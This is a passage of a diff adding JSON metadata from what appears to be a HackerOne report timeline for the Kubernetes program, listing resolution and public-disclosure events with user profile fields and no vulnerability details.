+      "updated_at": "2022-11-22T17:57:08.293Z",
+      "actor": {
+        "username": "gaffy",
+        "cleared": true,
+        "verified": true,
+        "url": "/gaffy",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 21541857,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-04-25T12:24:37.407Z",
+      "updated_at": "2023-04-25T12:24:37.407Z",
+      "actor": {
+        "username": "saranbalaji90",
+        "cleared": false,
+        "verified": false,
+        "url": "/saranbalaji90",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "gaffy",
+        "url": "/gaffy"
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 21541979,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-04-25T12:37:49.631Z",
+      "updated_at": "2023-04-25T12:37:49.631Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "saranbalaji90",
+        "cleared": false,
+        "verified": false,
+        "url": "/saranbalaji90",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 22024730,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-05-25T12:37:58.278Z",
+      "updated_at": "2023-05-25T12:37:58.278Z",
+      "actor": {
+        "url": "/kubernetes",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Kubernetes"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
